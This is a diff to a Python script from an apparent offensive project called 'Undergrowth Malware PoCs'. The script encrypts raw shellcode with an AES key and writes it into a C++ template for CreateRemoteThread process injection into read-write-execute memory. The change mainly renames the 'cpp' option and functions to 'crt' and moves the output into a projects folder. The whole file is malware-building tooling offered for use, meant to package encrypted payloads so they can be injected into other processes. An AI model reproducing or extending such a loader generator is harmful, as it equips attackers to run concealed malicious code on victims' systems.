@@ -10,12 +10,12 @@ from string import Template
 import os
 
 templates = {
-	'cpp': './templates/encryptedShellcodeWrapper.cpp',
+	'crt': './templates/createremotethreadRWX.cpp',
 
 }
 
 resultFiles = {
-	'cpp': './results/encryptedShellcodeWrapper.cpp',
+	'crt': './projects/createremotethreadRWX.cpp',
 
 }
 
@@ -46,7 +46,7 @@ if __name__ == '__main__':
 	print("\n\n")
 	parser = argparse.ArgumentParser(add_help=True, description="Undergrowth Malware PoCs")
 	parser.add_argument("shellcodeFile", help="File name containing the raw shellcode to be encoded/encrypted")
-	parser.add_argument("-cpp", "--createremotethread", help="Generates C++ file code", action="store_true")
+	parser.add_argument("-crt", "--createremotethread", help="Generates C++ file code", action="store_true")
 	args = parser.parse_args() 
 
 	if not os.path.isdir("./projects"):
@@ -67,14 +67,14 @@ def convertFromTemplate(parameters, templateFile):
 		return None
 
 #Read in shellcode as bytearray
-def formatCPP(data, key):
+def formatCRT(data, key):
 	shellcode = "\\x"
 	shellcode += "\\x".join(format(ord(b),'02x') for b in data)
-	result = convertFromTemplate({'shellcode': shellcode, 'key': key}, templates['cpp'])
+	result = convertFromTemplate({'shellcode': shellcode, 'key': key}, templates['crt'])
 
 	if result != None:
 		try:
-			fileName = os.path.splitext(resultFiles['cpp'])[0] +  os.path.splitext(resultFiles['cpp'])[1]
+			fileName = os.path.splitext(resultFiles['crt'])[0] +  os.path.splitext(resultFiles['crt'])[1]
 			with open(fileName,"w+") as f:
 				f.write(result)
 				f.close()
@@ -83,4 +83,4 @@ def formatCPP(data, key):
 			print ("[!] Could not write C++ code  [{}]".format(fileName))
 if args.createremotethread:
 	print("Writing payload")
-	formatCPP(payload_s, aes_s)
+	formatCRT(payload_s, aes_s)
